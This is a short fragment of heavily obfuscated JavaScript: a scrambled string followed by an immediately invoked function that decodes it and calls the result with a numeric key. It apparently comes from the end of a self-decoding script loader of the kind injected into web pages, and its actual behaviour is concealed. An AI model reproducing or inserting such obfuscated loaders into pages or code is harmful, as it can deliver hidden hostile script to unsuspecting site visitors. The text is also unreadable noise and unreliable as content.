e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
